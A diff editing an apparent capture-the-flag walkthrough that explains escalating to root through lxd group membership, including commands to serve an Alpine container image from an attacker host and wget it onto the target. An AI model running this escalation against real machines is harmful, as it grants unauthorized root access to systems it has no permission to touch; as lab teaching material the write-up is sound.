@@ -187,9 +187,9 @@ $ groups
 john adm cdrom sudo dip plugdev lxd
 ```
 
-The user john is a member of the sudo group and if I had his password I could juse run sudo su and this would be all over. I don't know the password so I examine the other groups. The lxd group is interesting. I wasn't familiar with it but lxd is very similar to docker.
+The user john is a member of the sudo group and if I had his password I could just run `sudo su` and this would all be over. I don't know the password so I examine the other groups. The lxd group is interesting. I wasn't familiar with it but lxd is very similar to docker.
 
-I found out that I can run a lxc (which is a container) that will have escalated privileges and allow me to mount the hard drive of my machine. In other words, I can be the root user and mount my drive so that I have a root user on my drive.
+I found out that I can run a lxc container that will have escalated privileges and allow me to mount the hard drive of my machine. I can be the root user in my container and mount my drive and lxd will honor my container root user as if I was the target machine's root user. In other words, in my lxd container I will have root privileges on my target machine's drive.
 
 First things first, I need to grab a lxc container on my attack machine so that I can download it on my target machine. I run the following commands to download the lxc container and start a python http server so that my target machine can download it. Here are the commands I ran on my attack machine:
 
@@ -199,7 +199,7 @@ $ cd lxd-alpine-builder
 $ python3 -m http.server
 ```
 
-Now I am going to download what I need from attack machine onto the target machine. Here is the command I used:
+Now I am going to download what I need from attack machine onto the target machine. Here is the command I used from the target machine:
 
 ```bash
 $ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
